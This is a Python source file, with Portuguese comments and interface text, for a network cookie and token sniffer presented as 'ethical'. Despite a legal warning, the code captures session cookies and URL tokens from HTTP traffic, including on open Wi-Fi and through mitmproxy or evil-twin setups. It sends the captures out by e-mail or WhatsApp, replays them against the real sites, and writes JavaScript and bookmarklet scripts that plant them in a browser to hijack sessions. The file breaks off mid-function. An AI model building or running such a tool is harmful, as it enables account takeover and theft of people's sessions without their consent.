import scapy.all as scapy
from scapy.layers.http import HTTPRequest, HTTPResponse
from scapy.layers.tls.all import TLS
import argparse
import json
import os
import re
import sqlite3
import csv
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, filedialog
import logging
import sys
import time
import matplotlib.pyplot as plt
import requests
import subprocess
from urllib.parse import urlparse, quote
import socket
import base64

# Configurar parser de argumentos
def setup_argparse():
    parser = argparse.ArgumentParser(description="Ferramenta ética para extrair cookies de tráfego de rede")
    parser.add_argument("--interfaces", default="eth0", help="Interfaces de rede (ex.: eth0,wlan0)")
    parser.add_argument("--filters", default="tcp port 80", help="Filtros BPF (ex.: 'tcp port 80,tcp port 443')")
    parser.add_argument("--domain-filter", help="Filtrar por domínio (ex.: *.facebook.com)")
    parser.add_argument("--ip-filter", help="Filtrar por IP (ex.: 192.168.1.0/24)")
    parser.add_argument("--header-filter", help="Filtrar por cabeçalho HTTP (ex.: User-Agent:.*Mozilla.*)")
    parser.add_argument("--output-dir", default=".", help="Diretório para salvar resultados")
    parser.add_argument("--gui", action="store_true", help="Iniciar em modo GUI")
    parser.add_argument("--max-packets", type=int, default=100, help="Número máximo de pacotes")
    parser.add_argument("--timeout", type=int, help="Tempo máximo de captura (segundos)")
    parser.add_argument("--silent", action="store_true", help="Modo silencioso")
    parser.add_argument("--continuous", action="store_true", help="Captura contínua até Ctrl+C")
    parser.add_argument("--http-method", help="Filtrar por método HTTP (ex.: GET,POST)")
    parser.add_argument("--cookie-type", choices=["session", "persistent"], help="Filtrar por tipo de cookie")
    parser.add_argument("--email", help="Enviar resultados por e-mail")
    parser.add_argument("--whatsapp", help="Enviar resultados via WhatsApp")
    parser.add_argument("--proxy-file", help="Arquivo com proxies")
    parser.add_argument("--mitm", action="store_true", help="Usar mitmproxy para HTTPS")
    parser.add_argument("--mitm-dump", help="Salvar tráfego mitmproxy")
    parser.add_argument("--pcap", action="store_true", help="Salvar em .pcap")
    parser.add_argument("--wireshark-live", action="store_true", help="Exibir em Wireshark ao vivo")
    parser.add_argument("--auto-ports", action="store_true", help="Filtrar portas 80 e 443")
    parser.add_argument("--open-wifi", action="store_true", help="Modo otimizado para Wi-Fi aberto")
    parser.add_argument("--test-cookies", action="store_true", help="Testar cookies capturados")
    parser.add_argument("--test-tokens", action="store_true", help="Testar tokens capturados")
    parser.add_argument("--low-latency", action="store_true", help="Modo de baixa latência")
    parser.add_argument("--dry-run", action="store_true", help="Simular captura sem acessar rede")
    parser.add_argument("--xss-script", action="store_true", help="Gerar script XSS para injeção de cookies")
    parser.add_argument("--edit-this-cookie", action="store_true", help="Exportar para EditThisCookie")
    parser.add_argument("--cookie-editor", action="store_true", help="Exportar para Cookie-Editor")
    parser.add_argument("--token-capture", action="store_true", help="Capturar tokens na URL")
    parser.add_argument("--xss-detect", action="store_true", help="Detectar vulnerabilidades XSS")
    parser.add_argument("--domain-validate", action="store_true", help="Validar domínio dos cookies")
    parser.add_argument("--bookmarklet", action="store_true", help="Gerar bookmarklet para injeção")
    parser.add_argument("--browser-session", action="store_true", help="Gerar script para sessão no navegador")
    parser.add_argument("--postman", action="store_true", help="Exportar para coleção Postman")
    parser.add_argument("--audit", action="store_true", help="Auditar segurança dos cookies")
    parser.add_argument("--websocket", action="store_true", help="Capturar cookies em WebSockets")
    parser.add_argument("--burp", action="store_true", help="Exportar para Burp Suite")
    parser.add_argument("--evil-twin", action="store_true", help="Simular Evil Twin com MITM")
    parser.add_argument("--tutorial", action="store_true", help="Mostrar tutorial interativo")
    return parser.parse_args()

# Configurar logging
def setup_logging(output_dir, silent):
    os.makedirs(output_dir, exist_ok=True)
    logging.basicConfig(
        filename=os.path.join(output_dir, "cookie_sniffer.log"),
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    if not silent:
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        logging.getLogger().addHandler(console)

# Carregar configurações
def load_config(config_file="config.json"):
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {
            "interfaces": ["eth0"],
            "filters": ["tcp port 80"],
            "proxies": [],
            "smtp": {"server": "", "port": 587, "user": "", "password": ""},
            "whatsapp": {"api_url": "", "api_key": ""}
        }

# Inicializar banco de dados SQLite
def init_db(output_dir):
    conn = sqlite3.connect(os.path.join(output_dir, "cookies.db"))
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS cookies (domain TEXT, name TEXT, value TEXT, path TEXT, expires TEXT, secure INTEGER, session INTEGER, httponly INTEGER, samesite TEXT, timestamp TEXT, src_ip TEXT, dst_ip TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS tokens (url TEXT, token TEXT, timestamp TEXT)")
    conn.commit()
    return conn

# Carregar proxies
def load_proxies(proxy_file):
    if not proxy_file:
        return []
    with open(proxy_file, "r") as f:
        return [line.strip() for line in f if line.strip()]

# Validar cookie
def validate_cookie(cookie, domain_validate, domain):
    if domain_validate and cookie["domain"] != domain:
        return False
    if cookie["expires"] != "0":
        try:
            expires = datetime.fromisoformat(cookie["expires"].replace("Z", ""))
            if expires < datetime.now():
                return False
        except ValueError:
            return False
    return True

# Analisar cookie
def analyze_cookie(cookie):
    secure = 1 if "; Secure" in cookie.get("raw", "") or cookie.get("secure", 0) else 0
    session = 1 if cookie["expires"] == "0" else 0
    httponly = 1 if "; HttpOnly" in cookie.get("raw", "") else 0
    samesite = re.search(r"SameSite=([^;]+)", cookie.get("raw", "")) or None
    samesite = samesite.group(1) if samesite else "None"
    return {"secure": secure, "session": session, "httponly": httponly, "samesite": samesite}

# Auditar cookies
def audit_cookies(cookies, output_dir):
    audit_report = []
    for cookie in cookies:
        analysis = analyze_cookie(cookie)
        issues = []
        if not analysis["secure"]:
            issues.append("Falta atributo Secure")
        if not analysis["httponly"]:
            issues.append("Falta atributo HttpOnly")
        if analysis["samesite"] == "None":
            issues.append("SameSite=None pode permitir CSRF")
        audit_report.append({"cookie": f"{cookie['name']}={cookie['value']}", "issues": issues})
    with open(os.path.join(output_dir, "audit_report.json"), "w") as f:
        json.dump(audit_report, f, indent=4)
    return audit_report

# Salvar cookies em JSON
def save_to_json(cookies, output_dir):
    with open(os.path.join(output_dir, "cookies.json"), "w") as f:
        json.dump(cookies, f, indent=4)

# Salvar cookies em JSONL
def save_to_jsonl(cookies, output_dir):
    with open(os.path.join(output_dir, "cookies.jsonl"), "w") as f:
        for cookie in cookies:
            f.write(json.dumps(cookie) + "\n")

# Salvar cookies em CSV
def save_to_csv(cookies, output_dir):
    with open(os.path.join(output_dir, "cookies.csv"), "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp", "Domain", "Name", "Value", "Path", "Expires", "Secure", "Session", "HttpOnly", "SameSite", "Src IP", "Dst IP"])
        for cookie in cookies:
            analysis = analyze_cookie(cookie)
            writer.writerow([
                cookie["timestamp"], cookie["domain"], cookie["name"], cookie["value"],
                cookie["path"], cookie["expires"], analysis["secure"], analysis["session"],
                analysis["httponly"], analysis["samesite"], cookie["src_ip"], cookie["dst_ip"]
            ])

# Salvar cookies em formato Netscape
def save_to_netscape(cookies, output_dir):
    with open(os.path.join(output_dir, "cookies.txt"), "w") as f:
        f.write("# Netscape HTTP Cookie File\n")
        for cookie in cookies:
            f.write(f"{cookie['domain']}\tTRUE\t{cookie['path']}\tFALSE\t{cookie['expires']}\t{cookie['name']}\t{cookie['value']}\n")

# Salvar cookies para EditThisCookie
def save_to_edit_this_cookie(cookies, output_dir):
    with open(os.path.join(output_dir, "edit_this_cookie.json"), "w") as f:
        etc_cookies = [
            {
                "domain": cookie["domain"],
                "path": cookie["path"],
                "secure": bool(analyze_cookie(cookie)["secure"]),
                "expirationDate": int(datetime.fromisoformat(cookie["expires"].replace("Z", "")).timestamp()) if cookie["expires"] != "0" else 0,
                "name": cookie["name"],
                "value": cookie["value"],
                "httpOnly": bool(analyze_cookie(cookie)["httponly"]),
                "sameSite": analyze_cookie(cookie)["samesite"].lower()
            } for cookie in cookies
        ]
        json.dump(etc_cookies, f, indent=4)

# Salvar cookies para Cookie-Editor
def save_to_cookie_editor(cookies, output_dir):
    with open(os.path.join(output_dir, "cookie_editor.json"), "w") as f:
        ce_cookies = [
            {
                "name": cookie["name"],
                "value": cookie["value"],
                "domain": cookie["domain"],
                "path": cookie["path"],
                "expires": cookie["expires"],
                "secure": bool(analyze_cookie(cookie)["secure"]),
                "httpOnly": bool(analyze_cookie(cookie)["httponly"]),
                "sameSite": analyze_cookie(cookie)["samesite"]
            } for cookie in cookies
        ]
        json.dump(ce_cookies, f, indent=4)

# Salvar cookies para Postman
def save_to_postman(cookies, output_dir):
    with open(os.path.join(output_dir, "postman_collection.json"), "w") as f:
        collection = {
            "info": {"name": "Cookie Sniffer Collection", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"},
            "item": [
                {
                    "name": f"Test {cookie['domain']}",
                    "request": {
                        "method": "GET",
                        "header": [{"key": "Cookie", "value": f"{cookie['name']}={cookie['value']}"}],
                        "url": {"raw": f"https://{cookie['domain']}{cookie['path']}", "host": [cookie["domain"]], "path": [cookie["path"]]}
                    }
                } for cookie in cookies
            ]
        }
        json.dump(collection, f, indent=4)

# Salvar cookies para Burp Suite
def save_to_burp(cookies, output_dir):
    with open(os.path.join(output_dir, "burp_cookies.txt"), "w") as f:
        for cookie in cookies:
            f.write(f"{cookie['name']}={cookie['value']}; Domain={cookie['domain']}; Path={cookie['path']}\n")

# Gerar script XSS
def generate_xss_script(cookies, output_dir):
    with open(os.path.join(output_dir, "xss_inject.js"), "w") as f:
        f.write("function injectCookies() {\n")
        for cookie in cookies:
            f.write(f"    document.cookie = '{cookie['name']}={cookie['value']}; path={cookie['path']}; domain={cookie['domain']}';\n")
        f.write("    alert('Cookies injetados!');\n")
        f.write("}\ninjectCookies();\n")

# Gerar bookmarklet
def generate_bookmarklet(cookies, output_dir):
    with open(os.path.join(output_dir, "bookmarklet.js"), "w") as f:
        code = "javascript:(function() {"
        for cookie in cookies:
            code += f"document.cookie='{cookie['name']}={cookie['value']}; path={cookie['path']}; domain={cookie['domain']}';"
        code += "alert('Cookies injetados via bookmarklet!');})();"
        f.write(code)

# Gerar script de sessão no navegador
def generate_browser_session(cookies, output_dir):
    with open(os.path.join(output_dir, "browser_session.js"), "w") as f:
        f.write("function startSession() {\n")
        f.write("    var cookies = [\n")
        for cookie in cookies:
            f.write(f"        {{name: '{cookie['name']}', value: '{cookie['value']}', domain: '{cookie['domain']}', path: '{cookie['path']}'}},\n")
        f.write("    ];\n")
        f.write("    cookies.forEach(c => document.cookie = `${c.name}=${c.value}; path=${c.path}; domain=${c.domain}`);\n")
        f.write("    window.location = 'https://' + cookies[0].domain + cookies[0].path;\n")
        f.write("}\nstartSession();\n")

# Gerar relatório estatístico
def generate_report(cookies, output_dir):
    domains = {}
    for cookie in cookies:
        domain = cookie["domain"]
        domains[domain] = domains.get(domain, 0) + 1
    report = {
        "total_cookies": len(cookies),
        "domains": domains,
        "secure_cookies": sum(analyze_cookie(c)["secure"] for c in cookies),
        "session_cookies": sum(analyze_cookie(c)["session"] for c in cookies),
        "httponly_cookies": sum(analyze_cookie(c)["httponly"] for c in cookies),
        "samesite_stats": {"Strict": 0, "Lax": 0, "None": 0}
    }
    for cookie in cookies:
        samesite = analyze_cookie(cookie)["samesite"]
        report["samesite_stats"][samesite] += 1
    with open(os.path.join(output_dir, "report.json"), "w") as f:
        json.dump(report, f, indent=4)
    return report

# Gerar gráfico de cookies
def generate_graph(cookies, output_dir):
    domains = {}
    for cookie in cookies:
        domain = cookie["domain"]
        domains[domain] = domains.get(domain, 0) + 1
    plt.bar(domains.keys(), domains.values())
    plt.xlabel("Domínios")
    plt.ylabel("Número de Cookies")
    plt.xticks(rotation=45)
    plt.tight_layout()
    plt.savefig(os.path.join(output_dir, "cookies_graph.png"))
    plt.close()

# Enviar e-mail com resultados
def send_email(cookies, email, config, output_dir):
    if not email or not config.get("smtp", {}).get("server"):
        return
    msg = MIMEText(json.dumps(cookies, indent=4))
    msg["Subject"] = "Resultados de Captura de Cookies"
    msg["From"] = config["smtp"]["user"]
    msg["To"] = email
    try:
        with smtplib.SMTP(config["smtp"]["server"], config["smtp"]["port"]) as server:
            server.starttls()
            server.login(config["smtp"]["user"], config["smtp"]["password"])
            server.sendmail(msg["From"], msg["To"], msg.as_string())
        logging.info(f"E-mail enviado para {email}")
    except Exception as e:
        logging.error(f"Falha ao enviar e-mail: {e}")

# Enviar resultados via WhatsApp
def send_whatsapp(cookies, whatsapp, config, output_dir):
    if not whatsapp or not config.get("whatsapp", {}).get("api_url"):
        return
    try:
        response = requests.post(
            config["whatsapp"]["api_url"],
            headers={"Authorization": f"Bearer {config['whatsapp']['api_key']}"},
            json={"to": whatsapp, "message": json.dumps(cookies, indent=4)}
        )
        response.raise_for_status()
        logging.info(f"Mensagem enviada para {whatsapp} via WhatsApp")
    except Exception as e:
        logging.error(f"Falha ao enviar WhatsApp: {e}")

# Testar cookies capturados
def test_cookies(cookies, output_dir):
    results = []
    for cookie in cookies:
        try:
            headers = {"Cookie": f"{cookie['name']}={cookie['value']}"}
            response = requests.get(f"https://{cookie['domain']}{cookie['path']}", headers=headers, timeout=5)
            results.append({"cookie": f"{cookie['name']}={cookie['value']}", "status": response.status_code})
        except Exception as e:
            results.append({"cookie": f"{cookie['name']}={cookie['value']}", "status": f"Erro: {e}"})
    with open(os.path.join(output_dir, "cookie_test.json"), "w") as f:
        json.dump(results, f, indent=4)
    return results

# Testar tokens capturados
def test_tokens(tokens, output_dir):
    results = []
    for token in tokens:
        try:
            response = requests.get(f"{token['url']}?token={token['token']}", timeout=5)
            results.append({"token": token['token'], "url": token['url'], "status": response.status_code})
        except Exception as e:
            results.append({"token": token['token'], "url": token['url'], "status": f"Erro: {e}"})
    with open(os.path.join(output_dir, "token_test.json"), "w") as f:
        json.dump(results, f, indent=4)
    return results

# Detectar XSS
def detect_xss(packet):
    if packet.haslayer(HTTPResponse):
        http_layer = packet.getlayer(HTTPResponse)
        content = http_layer.load.decode("utf-8", errors="ignore") if http_layer.load else ""
        xss_patterns = [r"<script>", r"on\w+=['\"]", r"javascript:"]
        for pattern in xss_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
    return False

# Verificar certificado MITM
def check_mitm_cert():
    return os.path.exists("/path/to/mitmproxy/cert")  # Substitua pelo caminho real

# Processar pacotes
def process_packet(packet, cookies, tokens, output_dir, domain_filter, http_method, cookie_type, ip_filter, header_filter, pcap_writer, dry_run, xss_detect, domain_validate, token_capture, websocket):
    if dry_run:
        cookies.append({
            "domain": "example.com",
            "name": "test_cookie",
            "value": "test_value",
            "path": "/",
            "expires": "0",
            "timestamp": datetime.now().isoformat(),
            "src_ip": "127.0.0.1",
            "dst_ip": "127.0.0.1",
            "raw": "test_cookie=test_value"
        })
        return
    if ip_filter and packet.haslayer("IP"):
        if not (packet["IP"].src.startswith(ip_filter.split("/")[0]) or packet["IP"].dst.startswith(ip_filter.split("/")[0])):
            return
    if packet.haslayer(HTTPRequest):
        http_layer = packet.getlayer(HTTPRequest)
        if http_method and http_layer.Method.decode("utf-8").lower() != http_method.lower():
            return
        host = http_layer.Host.decode("utf-8") if http_layer.Host else "unknown"
        if domain_filter and not re.match(domain_filter.replace("*", ".*"), host):
            return
        if header_filter and not any(re.search(header_filter, f"{k}: {v.decode('utf-8', errors='ignore')}", re.IGNORECASE) for k, v in http_layer.fields.items() if isinstance(v, bytes)):
            return
        src_ip = packet["IP"].src if packet.haslayer("IP") else packet["IPv6"].src if packet.haslayer("IPv6") else "unknown"
        dst_ip = packet["IP"].dst if packet.haslayer("IP") else packet["IPv6"].dst if packet.haslayer("IPv6") else "unknown"
        if http_layer.Cookie:
            cookie_str = http_layer.Cookie.decode("utf-8")
            cookie = {
                "domain": host,
                "name": cookie_str.split("=")[0],
                "value": cookie_str.split("=")[1].split(";")[0],
                "path": http_layer.Path.decode("utf-8") if http_layer.Path else "/",
                "expires": "0",
                "timestamp": datetime.now().isoformat(),
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "raw": cookie_str
            }
            if cookie_type and analyze_cookie(cookie)["session"] != (1 if cookie_type == "session" else 0):
                return
            if validate_cookie(cookie, domain_validate, host):
                cookies.append(cookie)
                logging.info(f"Cookie capturado: {cookie_str} de {host}")
        elif http_layer.fields.get("Set-Cookie"):
            cookie_str = http_layer.fields["Set-Cookie"].decode("utf-8")
            expires = re.search(r"Expires=([^;]+)", cookie_str)
            cookie = {
                "domain": host,
                "name": cookie_str.split("=")[0],
                "value": cookie_str.split("=")[1].split(";")[0],
                "path": http_layer.Path.decode("utf-8") if http_layer.Path else "/",
                "expires": expires.group(1) if expires else "0",
                "timestamp": datetime.now().isoformat(),
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "raw": cookie_str
            }
            if cookie_type and analyze_cookie(cookie)["session"] != (1 if cookie_type == "session" else 0):
                return
            if validate_cookie(cookie, domain_validate, host):
                cookies.append(cookie)
                logging.info(f"Set-Cookie capturado: {cookie_str} de {host}")
        if token_capture and http_layer.Path:
            path = http_layer.Path.decode("utf-8")
            token_match = re.search(r"[?&]token=([^&]+)", path)
            if token_match:
                tokens.append({
                    "url": f"https://{host}{path.split('?')[0]}",
                    "token": token_match.group(1),
                    "timestamp": datetime.now().isoformat()
                })
                logging.info(f"Token capturado: {token_match.group(1)} em {host}")
        if xss_detect and detect_xss(packet):
            logging.warning(f"Possível vulnerabilidade XSS detectada em {host}")
        if pcap_writer:
            pcap_writer.write(packet)
        save_to_json(cookies, output_dir)
        save_to_jsonl(cookies, output_dir)
        save_to_csv(cookies, output_dir)
        save_to_netscape(cookies, output_dir)
        save_to_db(cookies, tokens, output_dir)
        if args.edit_this_cookie:
            save_to_edit_this_cookie(cookies, output_dir)
        if args.cookie_editor:
            save_to_cookie_editor(cookies, output_dir)
        if args.postman:
            save_to_postman(cookies, output_dir)
        if args.burp:
            save_to_burp(cookies, output_dir)
        if args.xss_script:
            generate_xss_script(cookies, output_dir)
        if args.bookmarklet:
            generate_bookmarklet(cookies, output_dir)
        if args.browser_session:
            generate_browser_session(cookies, output_dir)
    elif packet.haslayer(TLS):
        logging.warning("Tráfego HTTPS detectado. Use --mitm para capturar cookies HTTPS.")

# Salvar cookies e tokens no banco de dados
def save_to_db(cookies, tokens, output_dir):
    conn = init_db(output_dir)
    c = conn.cursor()
    for cookie in cookies:
        analysis = analyze_cookie(cookie)
        c.execute(
            "INSERT INTO cookies VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (
                cookie["domain"], cookie["name"], cookie["value"], cookie["path"],
                cookie["expires"], analysis["secure"], analysis["session"],
                analysis["httponly"], analysis["samesite"], cookie["timestamp"],
                cookie["src_ip"], cookie["dst_ip"]
            )
        )
    for token in tokens:
        c.execute("INSERT INTO tokens VALUES (?, ?, ?)", (token["url"], token["token"], token["timestamp"]))
    conn.commit()
    conn.close()

# Aviso legal
def show_legal_warning():
    print("\033[1;91m=== AVISO LEGAL ===")
    print("Esta ferramenta deve ser usada APENAS em redes próprias ou com autorização explícita.")
    print("Cookies não podem ser embutidos diretamente em links (ex.: site.com?cookie=abc123).")
    print("Capturar cookies sem permissão viola leis como GDPR e CCPA.")
    confirm = input("\033[1;97mDigite 'concordo' para continuar: ")
    if confirm.lower() != "concordo":
        print("\033[1;91mOperação cancelada.")
        sys.exit(1)

# Tutorial interativo
def run_tutorial():
    print("\033[1;97m=== Tutorial de Captura de Cookies ===")
    print("1. Cookies são armazenados no navegador e enviados em cabeçalhos HTTP, não em URLs.")
    print("2. HTTP: Cookies visíveis em redes abertas. HTTPS: Requer MITM com certificados confiáveis.")
    print("3. XSS pode injetar cookies em sites vulneráveis. Use --xss-script para gerar exemplos.")
    print("4. Tokens na URL (ex.: ?token=abc123) podem ser capturados com --token-capture.")
    print("5. Sempre obtenha permissão explícita para capturar dados.")
    input("\033[1;97mPressione Enter para continuar...")

# Capturar pacotes
def sniff_packets(interfaces, filters, max_packets, timeout, output_dir, domain_filter, http_method, cookie_type, ip_filter, header_filter, continuous, pcap, mitm, dry_run, wireshark_live, xss_detect, domain_validate, token_capture, websocket, evil_twin):
    cookies = []
    tokens = []
    pcap_writer = scapy.wrpcap(os.path.join(output_dir, "capture.pcap"), []) if pcap else None
    if wireshark_live:
        subprocess.Popen(["wireshark", "-k", "-i", interfaces.split(",")[0]])
    if mitm and not check_mitm_cert():
        logging.error("Certificado MITM não encontrado. Configure mitmproxy corretamente.")
        sys.exit(1)
    if evil_twin:
        logging.info("Configurando Evil Twin com mitmproxy (simulação). Certifique-se de ter permissões.")
        subprocess.Popen(["mitmproxy", "--mode", "transparent"])
    def packet_handler(pkt):
        process_packet(pkt, cookies, tokens, output_dir, domain_filter, http_method, cookie_type, ip_filter, header_filter, pcap_writer, dry_run, xss_detect, domain_validate, token_capture, websocket)
    try:
        filter_bpf = " or ".join(filters.split(",")) if not dry_run else ""
        if dry_run:
            packet_handler(None)
        elif continuous:
            scapy.sniff(iface=interfaces.split(","), filter=filter_bpf, prn=packet_handler, store=0)
        else:
            scapy.sniff(
                iface=interfaces.split(","), filter=filter_bpf, prn=packet_handler,
                count=max_packets, timeout=timeout, store=0
            )
    except KeyboardInterrupt:
        logging.info("Captura interrompida pelo usuário")
    return cookies, tokens

# Interface gráfica
def main_gui(args):
    setup_logging(args.output_dir, args.silent)
    config = load_config()

    def start_sniffing():
        interfaces = entry_interfaces.get() or config["interfaces"][0]
        filters = entry_filters.get() or config["filters"][0]
        max_packets = int(entry_packets.get()) if entry_packets.get() else args.max_packets
        timeout = int(entry_timeout.get()) if entry_timeout.get() else args.timeout
        domain_filter = entry_domain.get()
        http_method = entry_method.get()
        cookie_type = entry_cookie_type.get()
        ip_filter = entry_ip.get()
        header_filter = entry_header.get()
        continuous = var_continuous.get()
        pcap = var_pcap.get()
        mitm = var_mitm.get()
        wireshark_live = var_wireshark.get()
        dry_run = var_dry.get()
        xss_detect = var_xss.get()
        domain_validate = var_domain.get()
        token_capture = var_token.get()
        websocket = var_websocket.get()
        evil_twin = var_evil.get()
        cookies, tokens = sniff_packets(
            interfaces, filters, max_packets, timeout, args.output_dir, domain_filter,
            http_method, cookie_type, ip_filter, header_filter, continuous, pcap, mitm,
            dry_run, wireshark_live, xss_detect, domain_validate, token_capture, websocket, evil_twin
        )
        text_results.delete(1.0, tk.END)
        for cookie in cookies:
            text_results.insert(tk.END, f"{cookie['timestamp']} | {cookie['domain']} | {cookie['name']}={cookie['value']}\n")
        for token in tokens:
            text_results.insert(tk.END, f"{token['timestamp']} | Token: {token['token']} | URL: {token['url']}\n")
        report = generate_report(cookies, args.output_dir)
        generate_graph(cookies, args.output_dir)
        if args.audit:
            audit_report = audit_cookies(cookies, args.output_dir)
            text_results.insert(tk.END, f"\nAuditoria: {json.dumps(audit_report, indent=4)}\n")
        text_results.insert(tk.END, f"\nRelatório: {json.dumps(report, indent=4)}\n")
        if entry_email.get():
            send_email(cookies, entry_email.get(), config, args.output_dir)
        if entry_whatsapp.get():
            send_whatsapp(cookies, entry_whatsapp.get(), config, args.output_dir)
        if var_test.get():
            test_results = test_cookies(cookies, args.output_dir)
            text_results.insert(tk.END, f"\nTeste de Cookies: {json.dumps(test_results, indent=4)}\n")
        if var_test_token.get():
            token_results = test_tokens(tokens, args.output_dir)
            text_results.insert(tk.END, f"\nTeste de Tokens: {json.dumps(token_results, indent=4)}\n")
        messagebox.showinfo("Concluído", f"Captura finalizada. Resultados salvos em {args.output_dir}.")

    def save_config():
        config = {
            "interfaces": entry_interfaces.get().split(","),
            "filters": entry_filters.get().split(","),
            "smtp": {"server": entry_smtp.get(), "port": 587, "user": entry_smtp_user.get(), "password": entry_smtp_pass.get()},
            "whatsapp": {"api_url": entry_whatsapp_api.get(), "api_key": entry_whatsapp_key.get()}
        }
        with open("config.json", "w") as f:
            json.dump(config, f, indent=4)
        messagebox.showinfo("Sucesso", "Configuração salva em config.json.")

    root = tk.Tk()
    root.title("Cookie Sniffer Ético")

    tk.Label(root, text="Interfaces de Rede (ex.: eth0,wlan0):").grid(row=0, column=0, padx=5, pady=5)
    entry_interfaces = tk.Entry(root, width=30)
    entry_interfaces.insert(0, args.interfaces)
    entry_interfaces.grid(row=0, column=1, padx=5, pady=5)

    tk.Label(root, text="Filtros BPF (ex.: tcp port 80,tcp port 443):").grid(row=1, column=0, padx=5, pady=5)
    entry_filters = tk.Entry(root, width=30)
    entry_filters.insert(0, args.filters)
    entry_filters.grid(row=1, column=1, padx=5, pady=5)

    tk.Label(root, text="Máximo de Pacotes:").grid(row=2, column=0, padx=5, pady=5)
    entry_packets = tk.Entry(root, width=30)
    entry_packets.insert(0, str(args.max_packets))
    entry_packets.grid(row=2, column=1, padx=5, pady=5)

    tk.Label(root, text="Timeout (segundos):").grid(row=3, column=0, padx=5, pady=5)
    entry_timeout = tk.Entry(root, width=30)
    entry_timeout.grid(row=3, column=1, padx=5, pady=5)

    tk.Label(root, text="Filtro de Domínio (ex.: *.facebook.com):").grid(row=4, column=0, padx=5, pady=5)
    entry_domain = tk.Entry(root, width=30)
    entry_domain.grid(row=4, column=1, padx=5, pady=5)

    tk.Label(root, text="Método HTTP (ex.: GET,POST):").grid(row=5, column=0, padx=5, pady=5)
    entry_method = tk.Entry(root, width=30)
    entry_method.grid(row=5, column=1, padx=5, pady=5)

    tk.Label(root, text="Tipo de Cookie (session/persistent):").grid(row=6, column=0, padx=5, pady=5)
    entry_cookie_type = tk.Entry(root, width=30)
    entry_cookie_type.grid(row=6, column=1, padx=5, pady=5)

    tk.Label(root, text="Filtro de IP (ex.: 192.168.1.0/24):").grid(row=7, column=0, padx=5, pady=5)
    entry_ip = tk.Entry(root, width=30)
    entry_ip.grid(row=7, column=1, padx=5, pady=5)

    tk.Label(root, text="Filtro de Cabeçalho (ex.: User-Agent:.*Mozilla.*):").grid(row=8, column=0, padx=5, pady=5)
    entry_header = tk.Entry(root, width=30)
    entry_header.grid(row=8, column=1, padx=5, pady=5)

    tk.Label(root, text="E-mail para Notificação:").grid(row=9, column=0, padx=5, pady=5)
    entry_email = tk.Entry(root, width=30)
    entry_email.grid(row=9, column=1, padx=5, pady=5)

    tk.Label(root, text="Número WhatsApp:").grid(row=10, column=0, padx=5, pady=5)
    entry_whatsapp = tk.Entry(root, width=30)
    entry_whatsapp.grid(row=10, column=1, padx=5, pady=5)

    tk.Label(root, text="URL API WhatsApp:").grid(row=11, column=0, padx=5, pady=5)
    entry_whatsapp_api = tk.Entry(root, width=30)
    entry_whatsapp_api.grid(row=11, column=1, padx=5, pady=5)

    tk.Label(root, text="Chave API WhatsApp:").grid(row=12, column=0, padx=5, pady=5)
    entry_whatsapp_key = tk.Entry(root, width=30, show="*")
    entry_whatsapp_key.grid(row=12, column=1, padx=5, pady=5)

    tk.Label(root, text="Servidor SMTP:").grid(row=13, column=0, padx=5, pady=5)
    entry_smtp = tk.Entry(root, width=30)
    entry_smtp.grid(row=13, column=1, padx=5, pady=5)

    tk.Label(root, text="Usuário SMTP:").grid(row=14, column=0, padx=5, pady=5)
    entry_smtp_user = tk.Entry(root, width=30)
    entry_smtp_user.grid(row=14, column=1, padx=5, pady=5)

    tk.Label(root, text="Senha SMTP:").grid(row=15, column=0, padx=5, pady=5)
    entry_smtp_pass = tk.Entry(root, width=30, show="*")
    entry_smtp_pass.grid(row=15, column=1, padx=5, pady=5)

    var_continuous = tk.BooleanVar()
    tk.Checkbutton(root, text="Modo Contínuo", variable=var_continuous).grid(row=16, column=1, padx=5, pady=5)

    var_pcap = tk.BooleanVar()
    tk.Checkbutton(root, text="Salvar em .pcap", variable=var_pcap).grid(row=17, column=1, padx=5, pady=5)

    var_mitm = tk.BooleanVar()
    tk.Checkbutton(root, text="Usar mitmproxy (HTTPS)", variable=var_mitm).grid(row=18, column=1, padx=5, pady=5)

    var_wireshark = tk.BooleanVar()
    tk.Checkbutton(root, text="Wireshark ao Vivo", variable=var_wireshark).grid(row=19, column=1, padx=5, pady=5)

    var_test = tk.BooleanVar()
    tk.Checkbutton(root, text="Testar Cookies", variable=var_test).grid(row=20, column=1, padx=5, pady=5)

    var_test_token = tk.BooleanVar()
    tk.Checkbutton(root, text="Testar Tokens", variable=var_test_token).grid(row=21, column=1, padx=5, pady=5)

    var_dry = tk.BooleanVar()
    tk.Checkbutton(root, text="Modo Simulação (Dry Run)", variable=var_dry).grid(row=22, column=1, padx=5, pady=5)

    var_xss = tk.BooleanVar()
    tk.Checkbutton(root, text="Detectar XSS", variable=var_xss).grid(row=23, column=1, padx=5, pady=5)

    var_domain = tk.BooleanVar()
    tk.Checkbutton(root, text="Validar Domínio", variable=var_domain).grid(row=24, column=1, padx=5, pady=5)

    var_token = tk.BooleanVar()
    tk.Checkbutton(root, text="Capturar Tokens", variable=var_token).grid(row=25, column=1, padx=5, pady=5)

    var_websocket = tk.BooleanVar()
    tk.Checkbutton(root, text="Capturar WebSockets", variable=var_websocket).grid(row=26, column=1, padx=5, pady=5)

    var_evil = tk.BooleanVar()
    tk.Checkbutton(root, text="Simular Evil Twin", variable=var_evil).grid(row=27, column=1, padx=5, pady=5)

    tk.Button(root, text="Iniciar Captura", command=start_sniffing).grid(row=28, column=1, padx=5, pady=5)
    tk.Button(root, text="Salvar Configuração", command=save_config).grid(row=29, column=1, padx=5, pady=5)

    text_results = tk.Text(root, height=10, width=60)
    text_results.grid(row=30, column=0, columnspan=2, padx=5, pady=5)

    root.mainloop()

# Função principal CLI
def main(args):
    if args.tutorial:
        run_tutorial()
    show_legal_warning()
    setup_logging(args.output_dir, args.silent)
    config = load_config()
